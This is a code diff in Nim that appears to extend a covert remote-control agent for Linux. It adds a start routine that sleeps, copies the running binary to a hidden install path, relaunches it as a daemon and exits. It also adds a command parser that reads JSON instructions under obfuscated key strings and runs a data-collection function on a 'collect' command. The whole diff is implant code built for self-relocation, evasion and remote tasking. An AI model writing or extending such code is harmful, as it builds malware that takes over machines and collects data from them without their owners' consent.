@@ -12,6 +12,8 @@ import crc32
 import os
 
 # Core functions
+proc linux_start*(): void
+proc linux_parse_command*(command: JsonNode): bool
 
 # Command executors
 proc collect_data(): bool
@@ -112,3 +114,25 @@ proc get_linux_agent_id(): string =
 ##########################
 ##### Core functions #####
 ##########################
+
+proc linux_start*(): void =
+    sleep(sleep_on_execution * 1000)
+    let binary_path = getAppFilename()
+    if is_exe and (binary_path != agent_execution_path_linux):
+        var agent_execution_dir = splitFile(agent_execution_path_linux)[0]
+        createDir(agent_execution_dir)
+        copyFile(binary_path, agent_execution_path_linux)
+        discard startProcess(agent_execution_path_linux, options={poDaemon})
+        quit()
+
+
+proc linux_parse_command*(command: JsonNode): bool =
+    var is_success: bool
+    var command_type = command[protectString("command_type")].getStr()
+
+    case command_type:
+        of protectString("collect"):
+            is_success = collect_data()
+        else:
+            is_success = false
+    return is_success
